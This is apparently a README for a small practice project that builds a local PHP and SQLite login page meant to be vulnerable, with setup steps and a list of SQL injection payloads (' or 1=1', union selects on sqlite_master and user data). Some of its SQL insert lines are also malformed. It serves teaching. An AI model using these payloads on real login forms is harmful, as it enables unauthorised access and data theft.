# sqlite3login

Is a simple sqlite database and php scrypt, Intented for learning basic sqlite injection. Edit
*This video was intended for learning sqlite database. 
github: https://github.com/Eliex/sqlite3login

Needed:
-xampp: https://www.apachefriends.org/index.html
-sqlite: https://www.sqlite.org/download.html

Steps:
-install xampp and run the Apache
-open php.ini located inside C:/xampp/php
-find extension=php_sqlite3.dll
-remove the semicolon and save
-create a sub folder inside at C:/xampp/htdocs and name it "sqlite3login"
-open your compiler (or you can use notepad)
-create file and name it "index.php"
-start coding
-open your browser and type localhost/sqlite3login (to check the code)
-goto https://www.sqlite.org/download.html
-find sqlite-tools-win32-x86-3170000.zip under Precompiled Binaries for Windows
-extract and copy the sqlite3.exe file and paste it to project folder.
-open your command prompt and locate the project folder.
-type 
 "sqlite3 database.db"

  CREATE TABLE USERS (ID integer primary key, USERNAME text, PASSWORD text, INFORMATION text);

  insert into USERS (USERNAME, PASSWORD, INFORMATION) values(Jhon, global, 0987654321);

(insert another user)
 
 insert into USERS (USERNAME, PASSWORD, INFORMATION) values(Rober, pass123, 1234567890);

.mode column
.headers on

select * from USERS;

-open your broweser and type
  USERNAME: Jhon  PASSWORD: global
  USERNAME: Rober PASSWORD: pass123

(make sure to put white space at the end of parameter)

  " or 1=1 -- 
  " union select 3 -- 
  " union select sql from sqlite_master where type = 'table' -- 
  " union select INFORMATION from USERS  -- 
try
   " union select INFORMATION from USERS where ID = 1 --
